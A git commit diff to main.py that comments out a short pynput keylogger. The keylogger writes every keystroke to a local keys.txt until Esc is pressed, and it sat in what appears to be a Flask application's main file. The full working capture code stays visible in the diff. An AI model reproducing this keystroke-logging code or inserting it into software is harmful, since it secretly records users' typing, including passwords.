140407991ad4a05356007f74b1e473de5a6ec7ca
SyedaHifza31 <hifzaali480@gmail.com>
2026-02-02 17:59:59 +0500

    Update main.py

--- main.py
+++ main.py
@@ -1,26 +1,26 @@
-log_file = "keys.txt"
-open(log_file, "w").close()
+# log_file = "keys.txt"
+# open(log_file, "w").close()
 
-from pynput import keyboard
+# from pynput import keyboard
 
-log_file = "keys.txt"
+# log_file = "keys.txt"
 
-def on_press(key):
-    with open(log_file, "a") as f:
-        try:
-            f.write(key.char)
-        except AttributeError:
-            f.write(f"[{key}]")
+# def on_press(key):
+#     with open(log_file, "a") as f:
+#         try:
+#             f.write(key.char)
+#         except AttributeError:
+#             f.write(f"[{key}]")
 
-def on_release(key):
-    if key == keyboard.Key.esc:
-        return False
+# def on_release(key):
+#     if key == keyboard.Key.esc:
+#         return False
 
-with keyboard.Listener(
-    on_press=on_press,
-    on_release=on_release) as listener:
-    listener.join()
-import os
+# with keyboard.Listener(
+#     on_press=on_press,
+#     on_release=on_release) as listener:
+#     listener.join()
+# import os
 from flask import Flask
 import os
 
